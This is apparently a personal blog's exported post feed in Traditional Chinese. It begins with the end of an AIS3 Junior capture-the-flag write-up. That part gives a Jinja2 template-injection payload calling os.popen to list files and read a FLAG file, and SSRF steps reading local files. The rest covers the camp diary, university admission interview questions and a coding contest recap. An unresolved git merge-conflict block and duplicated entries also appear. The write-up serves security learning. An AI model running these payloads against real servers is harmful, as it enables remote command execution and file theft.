<code>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read()</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/STI01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>裡面有個 FLAG 檔案，我們可以稍微修改 payload，讓它印出 FLAG 內容<br>
<code>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat FLAG').read()</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/STI01-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{._JinjaTWOOOO.__[&quot;SSTI]_.succ3ssXDD._}</code></p>

  </div>
<h3 id="STI-02">STI 02</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>利用與上題同樣的payload，即可取得FLAG<br>
<code>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat FLAG').read()</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/STI02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{b4by__.filt3rEvasion.__Succ3ss}</code></p>

  </div>
<h2 id="08-Server-Side-Request-Forgery">08 - Server-Side Request Forgery</h2>
<h3 id="SRF-01">SRF 01</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>一個可以分析圖片的網站 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SRF01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>先攔截看看封包內容 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SRF01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>因為題目提到 FLAG 藏在 <code>/app/FLAG</code> 中，將 url 改為 <code>/app/FLAG</code> 後重新送出即可在原始碼中發現編碼過的字串<br>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SRF01-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>使用 base64 decode 後，即可得到 FLAG</p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{file://SSRF___XDDD}</code></p>

  </div>
<h3 id="SRF-02">SRF 02</h3>

  <div class="note p-4 mb-4 rounded-small markdown-body default">
    <p>與上一題類似的網站</p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>題目雖然沒有說 FLAG 藏在哪裡，但 <s>我通靈推測藏在 localhost 中</s> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SRF02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body info">
    <p>使用 base64 decode 後，即可得到 FLAG</p>

  </div>

  <div class="note p-4 mb-4 rounded-small markdown-body success">
    <p><code>AIS3_Junior{http://BROAccessLOCAL}</code></p>

  </div>
]]></content>
      <categories>
        <category>課程學習</category>
        <category>AIS3</category>
      </categories>
      <tags>
        <tag>課程</tag>
        <tag>AIS3</tag>
        <tag>筆記</tag>
      </tags>
  </entry>
  <entry>
<<<<<<< HEAD
    <title>AIS3 Junior 心得</title>
    <url>/AIS3-Junior/</url>
    <content><![CDATA[<hr>
<h3 id="前言">前言</h3>
<p>今年的 AIS3 Junior 舉辦在中正大學，課程共五天，也一樣有提供住宿及車票補助。超讚ㄉ<br>
我去年也曾參加 AIS3 Junior，不過因為當時是初次接觸資安，雖然最終有順利取得合格證書，但許多技術細節仍有些不熟悉。考量時間許可的情況下，我再次報名並順利被甄選錄取了！</p>
<hr>
<h3 id="住宿">住宿</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/dorm.png"
                      alt="image"
                ><br>
課程期間都是住在中正大學的學生宿舍(四人房)，要記得帶自己的拖鞋、枕頭、棉被、睡墊(很重要.ᐟ.ᐟ.ᐟ)、盥洗用品及吹風機等。裡面雖然有點老舊但還算乾淨，廁所也看得出來有重新裝修過，而且有乾濕分離。不過因為床板超硬，所以沒帶睡墊的話，根本睡不著而且因為床板老舊，翻身時還會有奇怪聲響。宿舍附近有超商和早餐店，半夜肚子餓的話可以去超商買消夜吃。不過課程所在的資訊大樓附近基本上就沒甚麼吃的了，除了活動中心那棟裡面有超商、貴貴的義大利麵和幾間學生餐廳外，其他吃的幾乎都要走出正門大概10分鐘左右才能找到。這幾天基本上不是跟助教、組員們一起吃，就是等回宿舍再去超商買或投販賣機。</p>
<hr>
<h3 id="Day-0">Day 0</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/register.png"
                      alt="image"
                ><br>
這天是課程中最輕鬆的一天，不過因為中正大學地理位置較偏僻，所以不論是搭高鐵或是臺鐵都要花上不少時間轉車。我是當天早上搭臺鐵到嘉義車站，在嘉義市區晃到下午再搭臺鐵到民雄車站，然後剛好在課程群組裡找到其他三人也要從民雄車站移動到中正大學，於是就四個人一起搭計程車去(跳表，車資220元)。抵達會場並報到後，安裝 Kali 環境、VPN 和認識助教及組員等。傍晚要從集合的圖書資訊大樓拖行李到宿舍，路途約15分鐘但半路突然突如其來的傾盆大雨讓我們的衣物、鞋子和行李都濕了。稍微整理後，我和助教及組員們一起吃附近的小火鍋。再次回到宿舍後，我和室友先解了幾題隔天上課的 Flag。</p>
<blockquote>
<p>本日睡眠時間： 01:30~07:00，約5.5小時。</p>
</blockquote>
<hr>
<h3 id="Day-1">Day 1</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/CTF.png"
                      alt="image"
                ><br>
早上和助教及組員們一起吃完早餐後，拖著疲憊的身體前往資訊大樓開始一天的課程。早上的活動是開幕式和資安倫理課程，讓我們瞭解學習資安技術應具備的道德與責任。下午則進行破冰遊戲，需要根據提示並運用基礎資安概念解題，完成一定題數還有餅乾。隨後的資安概論課程聚焦於 Linux 指令的實際操作，基本上只要熟悉 Linux 大部分的 Flag 都不難找到。</p>
<blockquote>
<p>本日睡眠時間： 02:30~07:00，約4.5小時。</p>
</blockquote>
<hr>
<h3 id="Day-2">Day 2</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/lecture.png"
                      alt="image"
                ><br>
今天主要的課程是由 <strong>徐牧遠(Red) 講師</strong> 帶來的網頁安全。我曾在去年的課程中學習過 Web Security，因此能跟上講師的節奏，也解出了不少進階題。晚上則安排了資安講座，邀請資安大佬 <strong>馬聖豪 前輩</strong>，分享自己從小透過撰寫遊戲外掛賺錢到參加第一屆 AIS3，最終在資安領域嶄露頭角的心路歷程。</p>
<blockquote>
<p>本日睡眠時間： 03:00~07:30，約4.5小時。</p>
</blockquote>
<hr>
<h3 id="Day-3">Day 3</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/project.png"
                      alt="image"
                ><br>
最後一門課程是由 <strong>周佑康(Slash) 講師</strong> 帶來的 AI 應用安全實務。我覺得 AI 應用安全是個全新的體驗。因為我從未想過利用這些攻擊方法來影響人工智慧，取得可能混進訓練資料中的敏感資訊或在圖片中加入雜訊使神經網路辨認錯誤。講師從 LLM 的訓練原理講起，並介紹常見的大型語言模型及講解 Prompt Injection 這個攻擊方法。課後作業則是從講師提供的 AI 服務中取得機密資訊。此外，我們在這堂課中也學習了 CNN 辨識影像的原理，並學習攻擊方法 - Adversarial Attack，透過演算法在圖片中加入許多極小的雜訊，使神經網路無法正確辨識圖片。因為隔天就要發表專題了，所以我們今晚熬夜將作業的 writeup 完成並將專題推到一定進度後才去睡覺。</p>
<blockquote>
<p>本日睡眠時間： 04:30~07:00，約2.5小時。</p>
</blockquote>
<hr>
<h3 id="Day-4">Day 4</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/report.png"
                      alt="image"
                ><br>
今天早上是最後的專題製作時間，我們這組的專題名稱是 「 原來 log 也可以寫 webshell !? 」 主要是透過 php 的 strcmp 函式漏洞 bypass 登入頁面，接著利用系統中的 LFI 漏洞實現 RCE。下午則是各組上台發表專題，讓其他組別的學員聆聽與學習的時間。從選定主題、漏洞復現到最終完成專題、上台分享時，那成就感不言而喻。雖然在處理環境時，我們遇到了不少問題，但一次次克服問題後，我們都會有更多的收穫。能將學到的知識與經驗分享給大家，也是一次非常寶貴的學習機會。</p>
<hr>
<h3 id="心得">心得</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/ending.png"
                      alt="image"
                ><br>
首先我要感謝 <strong>C組組員們</strong>、<strong>Kazma 助教</strong>和<strong>Sharon 助教</strong>，感謝你們在這幾天提供了我這麼多的幫助。雖然在專題中，我負責的是蒐集資料和尋找漏洞的防範方法，但對 php 不熟的我，光是搞懂基本語法就花了些時間。理解攻擊方法後尋找先例並思考有效的防範方法更是花了快一整晚。不過我們也順利在最後一天完成專題，並和組員們一起上台發表。參加這次課程，讓我認識了許多電神並對未來的學習有了明確方向，甚至有幸與 <strong>Kazma</strong>、<strong>Vincent</strong>、<strong>OsGa</strong> 等厲害的學長們同桌吃早餐真的是我沒有想到的。不過這也讓我意識到，自己在資安領域還有很多技術需要學習、探索。雖然目前的學習深度和廣度還不足以完全應對現實世界中的攻擊與威脅，但對未來繼續深入學習充滿了動力！沒意外的話，我未來應該也會往這方面升學吧！雖然很累，但學到新知識及技術的成就感，真的讓人有想要繼續研究下去的動力。<strong>To be a good hacker !</strong> 💪💪</p>
]]></content>
      <categories>
        <category>課程學習</category>
        <category>AIS3</category>
      </categories>
      <tags>
        <tag>課程</tag>
        <tag>AIS3</tag>
        <tag>心得</tag>
      </tags>
  </entry>
  <entry>
    <title>國立嘉義大學 特殊選才面試</title>
    <url>/NCYU/</url>
    <content><![CDATA[<hr>
<h3 id="面試資訊">面試資訊</h3>
<ul>
<li>教授人數：(2+2)</li>
<li>面試時長：(6+6) 分鐘</li>
<li>報名人數：一般 27 / 資安 11</li>
<li>招生名額：一般⠀3 / 資安⠀2</li>
</ul>
<h3 id="面試心得">面試心得</h3>
<p>嘉義是我最後一間面試的學校，我已經不再對面試感到緊張，能夠從容地回答教授提出的問題。這次 12 分鐘的面試相當緊湊，幾乎把我所有在備審和自我介紹中提到的所有經歷與技術都問到了，也讓我感受到教授們在面試時的用心。教授們的問題都沒有過於刁鑽或深入，與我所了解的知識和技術相符，順利回答完了所有題目。</p>
<h3 id="面試問題">面試問題</h3>
<ul>
<li><strong>教授：自我介紹</strong><br>
（略）</li>
<li><strong>教授：你有甚麼特別的資安經歷</strong><br>
（略）</li>
<li><strong>教授：擔任衛生股長期間，為班上做了哪些事？</strong><br>
（略）</li>
<li><strong>教授：如果換成其他人擔任，能達到相同成果嗎？</strong><br>
（略）</li>
<li><strong>教授：你在資訊領域學習得很廣泛，為什麼想接觸這麼多領域？</strong><br>
因為從高一下學期開始，就漸漸有了就讀資工系的念頭。為了更清楚地瞭解自己在資訊領域中的興趣與強項，所以積極學習不同領域的知識。除了程式設計，還有資訊安全、人工智慧及機器學習等，來幫助我探索各領域的應用及挑戰，並進一步確立未來的方向。</li>
<li><strong>教授：你有參加過大學先修？</strong><br>
我在去年參加了中興大學的機器學習先修，課程涵蓋許多常見的機器學習方式及演算法，並介紹其中的原理、細節。不過主要著重在理論觀念的建立，程式實作部分較少。</li>
<li><strong>教授：你會甚麼程式語言</strong><br>
比較擅長 C++，其次是 Python。</li>
<li><strong>教授：C++ / Python 分別學到哪裡？</strong><br>
C++ 學到基礎演算法及 STL；Python 則會基礎語法，並能使用 Pycord 開發 DCbot 及撰寫 pwn 題型的解法。</li>
<li><strong>教授：為什麼想學 python</strong><br>
在學習 C++ 之後，我開始思考如何將所學應用於生活中，想起曾經接觸過 Discord 機器人，讓我萌生了學習 Python 並開發機器人的念頭。</li>
<li><strong>教授：開發 Discord Bot 時遇到哪些困難？如何解決？</strong><br>
在開發 Discord Bot 時，就有遇到爬蟲程式報錯，但我不清楚是哪個部份出了問題。後來在 Stack Overflow 找到相關解法，發現問題出在該網站設有防爬蟲機制。我透過添加 headers 成功繞過限制，解決了問題。</li>
<li><strong>教授：解釋 pass by value 和 pass by reference 的差異。</strong><br>
pass by value 會在函式中改變變數值，但不影響主程式中的變數；而 pass by reference 則直接修改記憶體位置，使主程式的變數同步改變。</li>
<li><strong>教授：你知道物件導向嗎？</strong><br>
閱讀過物件導向相關文章，知道封裝、繼承和多型的概念，但沒有實做過。</li>
<li><strong>教授：你有參加過 AIS3 嗎？</strong><br>
參加過 AIS3 Junior，期待未來可以進一步參加 AIS3 學習更進階的技術。</li>
<li><strong>教授：AIS3 的 pre-exam，你參加過嗎？</strong><br>
我沒有參加過實體 CTF，比較常練習 picoCTF 和教育部培訓課程中的題目。</li>
<li><strong>教授：為什麼不參加實體 CTF 比賽？</strong><br>
高中期間缺乏比賽經驗，主要是因為我們學校對資訊領域有熱忱的同學比較少，加上學校資源有限，也沒有相關的培訓課程。希望能在大學期間與同樣對資訊領域有興趣的同學組隊參加演算法及資安競賽。</li>
<li><strong>教授：講一下你挖到的 XSS 漏洞。</strong><br>
我是在一間燈具公司官網的搜尋欄位中發現漏洞，透過輸入 JavaScript 標籤，可以觸發 Reflected XSS，使得惡意程式碼在使用者瀏覽器中執行。</li>
<li><strong>教授：你知道 OWASP Top 10 嗎？有哪些常見漏洞？</strong><br>
OWASP Top 10 是針對 Web Security 的常見漏洞排行榜，例如 Broken Access Control、SQL Injection、Cross-Site Scripting (XSS) 和 Server Side Template Injection (SSTI) 等，這些漏洞可能導致敏感資訊洩露或系統遭到入侵。</li>
<li><strong>教授：你知道 OWASP 排行榜會變動嗎？</strong><br>
知道，OWASP Top 10 會根據企業實際回報的漏洞數據、風險評估與攻擊趨勢，每隔幾年進行更新。例如 2021 年新增了 Insecure Design 這類與安全設計相關的項目，反映出現代網頁開發中面臨的新風險。</li>
<li><strong>教授：哪些漏洞常年位居榜單？</strong><br>
Injection 及 Broken Access Control 是 OWASP Top 10 長期存在的問題，因為它們影響範圍廣，且攻擊方式多樣，使得許多系統仍容易受到這些攻擊的影響。</li>
<li><strong>教授：你學過密碼學，可以講講對稱與非對稱加密嗎？</strong><br>
對稱式加密使用一把密鑰進行加、解密，運算速度較快，適合大量數據的加密；非對稱加密使用公鑰加密，私鑰解密，常用於數位簽章。</li>
</ul>
]]></content>
      <categories>
        <category>特殊選才</category>
        <category>面試</category>
      </categories>
      <tags>
        <tag>心得</tag>
        <tag>特殊選才</tag>
        <tag>面試</tag>
      </tags>
  </entry>
  <entry>
    <title>國立高雄大學 特殊選才面試</title>
    <url>/NUK/</url>
    <content><![CDATA[<hr>
<h3 id="面試資訊">面試資訊</h3>
<ul>
<li>教授人數： 3</li>
<li>面試時長：6 分鐘</li>
<li>報名人數：一般 67 / 資安⠀0</li>
<li>招生名額：一般⠀3 / 資安⠀0</li>
</ul>
<h3 id="面試心得">面試心得</h3>
<p>高雄是我第二間面試的學校，雖然面試難免會緊張，但其實教授問的題目大多是考古題。再加上教授們也還算親切，整體來說，這次面試的氛圍相對輕鬆，壓力不像台南那麼大。</p>
<h3 id="面試問題">面試問題</h3>
<ul>
<li>
<p><strong>白板：自我介紹</strong></p>
</li>
<li>
<p><strong>白板：家庭背景</strong></p>
</li>
<li>
<p><strong>白板：學業狀況</strong></p>
</li>
<li>
<p><strong>白板：讀書計畫</strong></p>
</li>
<li>
<p><strong>教授：你擅長的程式語言？</strong><br>
比較擅長 C++，其次是 Python。</p>
</li>
<li>
<p><strong>教授：你知道 <code>a?b:c</code> 可以做什麼嗎？</strong><br>
這是三元運算子，當 a 為 true 時回傳 b，反之回傳 c。</p>
</li>
<li>
<p><strong>教授：<code>using namespace std</code> 是什麼意思？</strong><br>
表示使用 std 這個命名空間，這樣可以省略 <code>std::</code>。</p>
</li>
<li>
<p><strong>教授：你曾經使用過命名空間來寫程式嗎？</strong><br>
目前還沒有使用過自定的命名空間。</p>
</li>
<li>
<p><strong>教授：你有學過密碼學嗎？能簡單說明密碼學的兩大類型嗎？</strong><br>
我在去年參加資安暑訓營時學過密碼學，主要分為對稱式加密與非對稱式加密。</p>
</li>
<li>
<p><strong>教授：你考過英檢嗎？未來有打算考多益嗎？</strong><br>
目前沒有考過英檢。不過因為我在準備特選的同時也有在準備學測，我在學測後有計畫報考多益。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>特殊選才</category>
        <category>面試</category>
      </categories>
      <tags>
        <tag>心得</tag>
        <tag>特殊選才</tag>
        <tag>面試</tag>
      </tags>
  </entry>
  <entry>
    <title>國立宜蘭大學 特殊選才面試</title>
    <url>/NIU/</url>
    <content><![CDATA[<hr>
<h3 id="面試資訊">面試資訊</h3>
<ul>
<li>教授人數： 2</li>
<li>面試時長：5 分鐘</li>
<li>報名人數：一般 48 / 資安 17</li>
<li>招生名額：一般⠀3 / 資安⠀3</li>
</ul>
<h3 id="面試心得">面試心得</h3>
<p>宜蘭是我第三間面試的學校，到現在已經沒這麼緊張了。不過我原本以為資安組會針對資安知識或技術細節提問，沒想到教授們反而都在問我專案中和小論文遇到的困難與解決方式。整體來看，宜蘭的教授們似乎更重視實務經驗和未來的發展方向。</p>
<h3 id="面試問題">面試問題</h3>
<ul>
<li><strong>教授：自我介紹</strong><br>
（略）</li>
<li><strong>教授：你有甚麼特別的資安經歷</strong><br>
（略）</li>
<li><strong>教授：在專案開發中遇到什麼困難？如何解決？</strong><br>
在開發 Discord Bot 時，就有遇到爬蟲程式報錯，但我不清楚是哪個部份出了問題。後來在 Stack Overflow 找到相關解法，發現問題出在該網站設有防爬蟲機制。我透過添加 User-Agent 解決這個問題。</li>
<li><strong>教授：你的小論文是如何進行的？</strong><br>
起初我們與指導老師反覆討論題目，最終決定以風力發電為題。我們針對風速、葉片數目及攻角角度三個變因進行實驗與數據分析，最後找出了最佳的配置方式以提升發電效率。</li>
<li><strong>教授：那你們的發電效率比現行的風力發電機更好嗎？</strong><br>
因為我們使用的是實驗室中的現成風力發電機組，與現行大型風力發電機不同，因此能源轉換率無法超越實際情況，不過我們研究出了最佳的效率配置情況。</li>
<li><strong>教授：你學過機器學習與人工智慧，也具備一定的資安能力。你認為可以如何結合兩者？</strong><br>
我認為可以透過機器學習訓練垃圾、釣魚郵件的模型，讓系統能自動辨識並阻擋釣魚信件，降低點擊到惡意連結的風險。</li>
</ul>
]]></content>
      <categories>
        <category>特殊選才</category>
        <category>面試</category>
      </categories>
      <tags>
        <tag>心得</tag>
        <tag>特殊選才</tag>
        <tag>面試</tag>
      </tags>
  </entry>
  <entry>
    <title>國立台南大學 特殊選才面試</title>
    <url>/NUTN/</url>
    <content><![CDATA[<hr>
<h3 id="面試資訊">面試資訊</h3>
<ul>
<li>教授人數： 2</li>
<li>面試時長：10 分鐘</li>
<li>報名人數：一般 51 / 資安⠀1</li>
<li>招生名額：一般⠀2 / 資安⠀1</li>
</ul>
<h3 id="面試心得">面試心得</h3>
<p>台南是我第一間面試的學校，在這之前沒有任何面試經驗，所以沒有抱太大的希望。基本上是把這次面試當作練習，但還是有點緊張。教授問了幾個出乎我意料的問題，而且兩位教授的態度較為嚴肅，整體氛圍有點壓力。</p>
<h3 id="面試問題">面試問題</h3>
<ul>
<li><strong>教授：自我介紹</strong><br>
（略）</li>
<li><strong>教授：你覺得自己有什麼特別之處？</strong><br>
（略）</li>
<li><strong>教授：你是從北部來的，你還有報哪些學校</strong>?<br>
除了貴校外，我還有報宜蘭、嘉義、高雄及台北市立大學。</li>
<li><strong>教授：你應該會想留在北部吧，為什麼想來我們學校？</strong><br>
我認為到外縣市讀大學也很不錯，可以接觸到不同的環境和文化。</li>
<li><strong>教授：你提到發現企業官網的XSS漏洞，那是什麼？</strong><br>
我是在一間燈具公司官網的搜尋欄位中發現漏洞，透過輸入 JavaScript 標籤，可以觸發 Reflected XSS，使得惡意程式碼在使用者瀏覽器中執行。</li>
<li><strong>教授：你會哪些程式語言?</strong><br>
比較擅長 C++，其次是 Python。</li>
<li><strong>教授：Python 和 C++ 之間有什麼差異？</strong><br>
我覺得的 Python 整體語法較簡單、容易上手，但 C++ 有較快的運行速度並且可以進行較底層的處理。</li>
<li><strong>教授：你提到的底層處理指的是什麼？</strong><br>
像是透過指標直接存取記憶體。我們學校最近在學 Arduino，其中的控制程式也可以使用 C++ 撰寫。</li>
<li><strong>教授：你只考過兩次 APCS？這期間有做什麼努力嗎？</strong><br>
我在今年和去年六月都有參加 APCS，觀念與實作題皆為三級分。我覺得很可惜的是，今年第三題我因為沒看清楚題目條件，所以僅取得了部份分數。</li>
<li><strong>教授：看起來你比較擅長實作，那觀念題有準備嗎？</strong><br>
我平常會跟網友討論程式，所以都有在閱讀別人的程式碼，我覺得這對於 APCS 的觀念題也有很大的幫助。</li>
</ul>
]]></content>
      <categories>
        <category>特殊選才</category>
        <category>面試</category>
      </categories>
      <tags>
        <tag>心得</tag>
        <tag>特殊選才</tag>
        <tag>面試</tag>
      </tags>
  </entry>
  <entry>
=======
>>>>>>> 44df68dab980bde633b8ced3e86cdc4b1b3a8365
    <title>2025 TOI 初選心得</title>
    <url>/TOI/</url>
    <content><![CDATA[<hr>
<blockquote>
<p>這是我第一次，也是最後一次參加 TOI。先前曾參加過 TOI 新手同好會及數次線上練習賽，整體感覺蠻新鮮的。</p>
</blockquote>
<h4 id="比賽當天">比賽當天</h4>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/TOI/NTNU.png"
                      alt="image"
                ></p>
<h4 id="第一題：二進制轉換與-1-連續次數排序">第一題：二進制轉換與 1 連續次數排序</h4>
<p><strong>題目描述</strong>：</p>
<ul>
<li>給定一組數字，依照以下規則排序：
<ol>
<li>轉換為二進制</li>
<li>計算連續 1 的最大長度</li>
<li>若長度相同，數字較小者優先</li>
</ol>
</li>
</ul>
<h4 id="第二題：疊煎餅">第二題：疊煎餅</h4>
<p><strong>題目描述</strong>：</p>
<ul>
<li>給定 n 堆數字，將相同的數字分到 n+1 堆，輸出移動過程</li>
</ul>
<h4 id="第三題：ACMAX">第三題：ACMAX</h4>
<p><strong>題目描述</strong>：</p>
<ul>
<li>給定長度為 n 的數列，求所有長度為 k 的子數列。
<ol>
<li>對每個子數列，計算每個數字的「權重」：出現次數 × 該數值。</li>
<li>找出權重最高的數作為該子數列的 AC 值，計算所有 AC 值的和並輸出。</li>
</ol>
</li>
</ul>
<h4 id="第四題：單色、雙色階梯統計">第四題：單色、雙色階梯統計</h4>
<p><strong>題目描述</strong>：</p>
<ul>
<li>給定一個由大寫英文字母 (A-Z) 組成的矩陣，每個字母代表不同的顏色。
<ol>
<li>找出矩陣中符合條件的 單色階梯（所有格子都是相同字母）。</li>
<li>找出符合條件的 雙色階梯（兩種字母交替出現，類似棋盤格）。</li>
<li>統計這兩種階梯的總數並輸出。</li>
</ol>
</li>
</ul>
<h4 id="第五題：農夫的最短巡視路徑">第五題：農夫的最短巡視路徑</h4>
<p><strong>題目描述</strong>：</p>
<ul>
<li>給定一張地圖，包含 N 個農場；一位農夫擁有其中 M 個農場並提供農夫家到所有農場的距離。
<ol>
<li>計算農夫巡視自己所有 M 個農場的最短路徑總長度，並輸出答案。</li>
</ol>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/TOI/cover.png"
                      alt="image"
                ></p>
]]></content>
      <categories>
        <category>程式設計</category>
        <category>競賽</category>
      </categories>
      <tags>
        <tag>心得</tag>
        <tag>程式設計</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>國立台南大學 特殊選才面試</title>
    <url>/NUTN/</url>
    <content><![CDATA[<hr>
<h3 id="面試資訊">面試資訊</h3>
<ul>
<li>教授人數： 2</li>
<li>面試時長：10 分鐘</li>
<li>報名人數：一般 51 / 資安⠀1</li>
<li>招生名額：一般⠀2 / 資安⠀1</li>
</ul>
<h3 id="面試心得">面試心得</h3>
<p>台南是我第一間面試的學校，在這之前沒有任何面試經驗，所以沒有抱太大的希望。基本上是把這次面試當作練習，但還是有點緊張。教授問了幾個出乎我意料的問題，而且兩位教授的態度較為嚴肅，整體氛圍有點壓力。</p>
<h3 id="面試問題">面試問題</h3>
<ul>
<li><strong>教授：自我介紹</strong><br>
（略）</li>
<li><strong>教授：你覺得自己有什麼特別之處？</strong><br>
（略）</li>
<li><strong>教授：你是從北部來的，你還有報哪些學校</strong>?<br>
除了貴校外，我還有報宜蘭、嘉義、高雄及台北市立大學。</li>
<li><strong>教授：你應該會想留在北部吧，為什麼想來我們學校？</strong><br>
我認為到外縣市讀大學也很不錯，可以接觸到不同的環境和文化。</li>
<li><strong>教授：你提到發現企業官網的XSS漏洞，那是什麼？</strong><br>
我是在一間燈具公司官網的搜尋欄位中發現漏洞，透過輸入 JavaScript 標籤，可以觸發 Reflected XSS，使得惡意程式碼在使用者瀏覽器中執行。</li>
<li><strong>教授：你會哪些程式語言?</strong><br>
比較擅長 C++，其次是 Python。</li>
<li><strong>教授：Python 和 C++ 之間有什麼差異？</strong><br>
我覺得的 Python 整體語法較簡單、容易上手，但 C++ 有較快的運行速度並且可以進行較底層的處理。</li>
<li><strong>教授：你提到的底層處理指的是什麼？</strong><br>
像是透過指標直接存取記憶體。我們學校最近在學 Arduino，其中的控制程式也可以使用 C++ 撰寫。</li>
<li><strong>教授：你只考過兩次 APCS？這期間有做什麼努力嗎？</strong><br>
我在今年和去年六月都有參加 APCS，觀念與實作題皆為三級分。我覺得很可惜的是，今年第三題我因為沒看清楚題目條件，所以僅取得了部份分數。</li>
<li><strong>教授：看起來你比較擅長實作，那觀念題有準備嗎？</strong><br>
我平常會跟網友討論程式，所以都有在閱讀別人的程式碼，我覺得這對於 APCS 的觀念題也有很大的幫助。</li>
</ul>
]]></content>
      <categories>
        <category>特殊選才</category>
        <category>面試</category>
      </categories>
      <tags>
        <tag>心得</tag>
        <tag>特殊選才</tag>
        <tag>面試</tag>
      </tags>
  </entry>
  <entry>
    <title>國立高雄大學 特殊選才面試</title>
    <url>/NUK/</url>
    <content><![CDATA[<hr>
<h3 id="面試資訊">面試資訊</h3>
<ul>
<li>教授人數： 3</li>
<li>面試時長：6 分鐘</li>
<li>報名人數：一般 67 / 資安⠀0</li>
<li>招生名額：一般⠀3 / 資安⠀0</li>
</ul>
<h3 id="面試心得">面試心得</h3>
<p>高雄是我第二間面試的學校，雖然面試難免會緊張，但其實教授問的題目大多是考古題。再加上教授們也還算親切，整體來說，這次面試的氛圍相對輕鬆，壓力不像台南那麼大。</p>
<h3 id="面試問題">面試問題</h3>
<ul>
<li>
<p><strong>白板：自我介紹</strong></p>
</li>
<li>
<p><strong>白板：家庭背景</strong></p>
</li>
<li>
<p><strong>白板：學業狀況</strong></p>
</li>
<li>
<p><strong>白板：讀書計畫</strong></p>
</li>
<li>
<p><strong>教授：你擅長的程式語言？</strong><br>
比較擅長 C++，其次是 Python。</p>
</li>
<li>
<p><strong>教授：你知道 <code>a?b:c</code> 可以做什麼嗎？</strong><br>
這是三元運算子，當 a 為 true 時回傳 b，反之回傳 c。</p>
</li>
<li>
<p><strong>教授：<code>using namespace std</code> 是什麼意思？</strong><br>
表示使用 std 這個命名空間，這樣可以省略 <code>std::</code>。</p>
</li>
<li>
<p><strong>教授：你曾經使用過命名空間來寫程式嗎？</strong><br>
目前還沒有使用過自定的命名空間。</p>
</li>
<li>
<p><strong>教授：你有學過密碼學嗎？能簡單說明密碼學的兩大類型嗎？</strong><br>
我在去年參加資安暑訓營時學過密碼學，主要分為對稱式加密與非對稱式加密。</p>
</li>
<li>
<p><strong>教授：你考過英檢嗎？未來有打算考多益嗎？</strong><br>
目前沒有考過英檢。不過因為我在準備特選的同時也有在準備學測，我在學測後有計畫報考多益。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>特殊選才</category>
        <category>面試</category>
      </categories>
      <tags>
        <tag>心得</tag>
        <tag>特殊選才</tag>
        <tag>面試</tag>
      </tags>
  </entry>
  <entry>
    <title>特殊選才 面試準備筆記</title>
    <url>/prepare/</url>
    <content><![CDATA[<hr>
<h2 id="自我介紹">自我介紹</h2>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>自我介紹(一般組) </summary>
    <div class='content markdown-body'>
      <ul>
<li>教授(們) 好，我是傅梓淳，目前就讀桃園市立平鎮高中。</li>
<li>我學習程式設計的時間約一年半，在這段期間也積極參與了許多資訊相關的課程及活動，探索資安與資訊領域的應用。</li>
<li>我參加了教育部的資安人才培育計畫、數位發展部的 AIGO 課程及國立中興大學的機器學習先修課程，加強我的資安知識基礎，並拓展我在人工智慧及機器學習領域的理解。</li>
<li>在實務應用上，我曾利用 Python 開發出 Discord 機器人，結合靜態爬蟲和 JSON 資料庫，解決日常生活中許多繁雜的工作。</li>
<li>除此之外，我也曾發現企業官網存在 XSS 漏洞並向 HITCON ZeroDay 回報。</li>
<li>我覺得自己在學習資訊領域的知識是比較廣泛的。因為從高一下學期開始，就漸漸有了就讀資工系的念頭。</li>
<li>為了更清楚地瞭解自己在資訊領域中的興趣與強項，所以積極學習不同領域的知識，幫助我探索各領域的應用及挑戰，並進一步確立未來的方向。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>自我介紹 (資安組) </summary>
    <div class='content markdown-body'>
      <ul>
